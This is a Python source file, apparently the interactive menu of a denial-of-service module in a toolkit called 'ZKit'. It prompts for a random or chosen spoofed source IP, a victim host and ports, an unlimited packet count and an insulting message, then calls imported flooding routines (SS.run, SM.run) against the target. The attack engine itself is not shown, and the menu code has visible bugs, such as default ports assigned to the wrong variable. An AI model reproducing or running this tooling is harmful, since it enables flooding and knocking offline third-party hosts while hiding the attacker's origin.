def main():
    import socket
    import os
    from os import path
    import sys
    if os.name == 'nt':
        from colorama import init 
        init(convert = True)
    sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
    from core.core import Color, random_ip, random_int
    import core.dos.SS as SS , core.dos.SM as SM
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    print(
        "What is The Type For Now Only TCP Supported : \n"
        "* = Not Supported right now\n"
        + red + "{1}--> SS (Single Ip , Single Port)\n"
        + green + "{2}--> SM (Single Ip , Multiple Ports\n"
        + blue + "{3}--> MS (Multiple Ips , Single Ports*\n"
        + yellow + "{4}--> MM (Multiple Ips , Multiple Ports*\n"
        + magenta + "{000}--> Back To Main Menu" + reset

    )
    CHOICE = str(input("..> "))
    if CHOICE == "000":
        pass
    elif CHOICE == "1":
        print(
            "Some Information Is Required Source_IP, Victim_IP, Source_Port, Victim_Port, Count, Message"
        )
        try:
            print(
                "[" + yellow + "*" + reset +
                "] Whats The Ip Address You Want To Attack From "
                "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Ip : ",
                end="",
            )
            SOURCE_IP = str(input(""))
        except EOFError:
            SOURCE_IP = random_ip()
        print(
            "[" + blue + "+" + reset +
            "] Using IP {} As Source_ip".format(SOURCE_IP)
        )

        try:
            print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack From "
                  "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Port : ", end="")
            SOURCE_PORT = int(input(""))
        except EOFError:

            SOURCE_PORT = random_int(1100, 4000)
            print(
                "[" + blue + "+" + reset +
                "] Using IP {} As Source_ip".format(SOURCE_PORT)
            )
        except:
            print("Oh God . Port is A Number Not A String")
            raise
        else:
            print(
                "[" + blue + "+" + reset +
                "] Using IP {} As Source_ip".format(SOURCE_PORT)
            )
        print("[" + yellow + "*" + reset + "] Whats The Host " +
              "Name Domain Name Or IP You Want To Attack To : ", end="")
        VICTIM_IP = str(input(""))
        print(
            "[" + blue + "+" + reset + "] Using IP {} As Victim_ip".format(VICTIM_IP))
        try:
            print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack "
                  + "to : Press Ctrl-Z Or On Nix-Based Ctrl-D To Use 80 : ", end="")
            VICTIM_PORT = int(input(""))
        except EOFError:
            SOURCE_PORT = 80
        except:
            print("Oh God . Port is A Number Not A String")
            raise

        try:
            print("[" + yellow + "*" + reset +
                  "] How Much Requests Do You Want To Send (-1 For Infinite) : ", end="")
            COUNT = int(input(""))
        except ValueError:
            print("Count Is A Number Using Default (-1)")
            COUNT = -1

        else:
            if COUNT == -1:
                print("[" + blue + "+" + reset +
                      "] Using Infinite As Count")
        try:
            print("[" + yellow + "*" + reset +
                  "] A Message For Your Victim (Default : Fuck You) Ctrl + Z Or Ctrl + D To Use Default  : ", end="")
            MESSAGE = str(input(""))
        except EOFError:
            MESSAGE = "Fuck You"
        
        SS.run(
            SOURCE_IP, VICTIM_IP, SOURCE_PORT, VICTIM_PORT, COUNT, MESSAGE
        )
        print("If you have seen any problem or "
              "want a feature that is not here please open an issue and "
              "tell me to make ZKit Stronger together")
    elif CHOICE == "2":
        print(
            "Some Information Is Required Source_IP, Victim_IP, Source_Port, Victim_Ports, Count, Message"
        )
        try:
            print(
                "[" + yellow + "*" + reset +
                "] Whats The Ip Address You Want To Attack From "
                "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Ip : ",
                end="",
            )
            SOURCE_IP = str(input(""))
        except EOFError:
            SOURCE_IP = random_ip()
        print(
            "[" + blue + "+" + reset +
            "] Using IP {} As Source_ip".format(SOURCE_IP)
        )

        try:
            print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack From "
                  "Press Ctrl-Z Or On Nix-Based Ctrl-D To Use A Random Port : ", end="")
            SOURCE_PORT = int(input(""))
        except EOFError:
            SOURCE_PORT = random_int(1100, 4000)
            print(
                "[" + blue + "+" + reset +
                "] Using IP {} As Source_ip".format(SOURCE_PORT)
            )
        except:
            print("Oh God . Port is A Number Not A String")
            pass
        else:
            print(
                "[" + blue + "+" + reset +
                "] Using IP {} As Source_ip".format(SOURCE_PORT)
            )
        print("[" + yellow + "*" + reset + "] Whats The Host " +
              "Name Domain Name Or IP You Want To Attack To : ", end="")
        VICTIM_IP = str(input(""))
        print(
            "[" + blue + "+" + reset + "] Using IP {} As Victim_ip".format(VICTIM_IP))
        try:
            print("[" + yellow + "*" + reset + "] Whats The Port You Want To Attack "
                  + "to : Press Ctrl-Z Or On Nix-Based Ctrl-D To Use 80 And 443 : ", end="")
            VICTIM_PORTS = str(input(""))
            VICTIM_PORTS = VICTIM_PORTS.split()
        except EOFError:
            SOURCE_PORT = [80, 443]

        try:
            print("[" + yellow + "*" + reset +
                  "] How Much Requests Do You Want To Send (-1 For Infinite) : ", end="")
            COUNT = int(input(""))
        except ValueError:
            print("Count Is A Number")
            pass
        else:
            if COUNT == -1:
                print("[" + blue + "+" + reset +
                      "] Using Infinite As Count")
        try:
            print("[" + yellow + "*" + reset +
                  "] A Message For Your Victim (Default : Fuck You) Ctrl + Z Or Ctrl + D To Use Default  : ", end="")
            MESSAGE = str(input(""))
        except EOFError:
            MESSAGE = "Fuck You"

        SM.run(
            SOURCE_IP, VICTIM_IP, SOURCE_PORT, VICTIM_PORTS, COUNT, MESSAGE
        )
        print("If you have seen any problem or "
              "want a feature that is not here please open an issue and "
              "tell me to make ZKit Stronger together")
